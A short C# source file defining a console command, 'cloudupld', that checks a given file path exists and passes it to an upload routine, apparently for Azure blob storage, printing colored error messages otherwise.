using System;
using System.IO;
using System.Text;
using Microsoft.WindowsAzure.Storage;
using Microsoft.WindowsAzure.Storage.Blob;
using System.Threading;
using System.Threading.Tasks;
using Neko_An0maly.CORE;

namespace Neko_An0maly.Commands
{
    public class CloudUpload : Command
    {
        public static string path = @"C:\ProgramData\";
        public static string filetoupld;
        public static string ext;
        public CloudUpload(string name) : base(name) { }

        public override string execute(string[] args)
        {
            if (args.Length == 1)
            {
                filetoupld = args[0];
                if (File.Exists(filetoupld))
                {
                    TransferProtocol.uploadData(args[0]);
                    return "";
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("File does not exist!");
                    Console.ForegroundColor = ConsoleColor.White;
                    return "";
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid arguments for 'cloudupld'. Requires 1 argument(s).");
                Console.ForegroundColor = ConsoleColor.White;
                return "";
            }
        }
    }
}
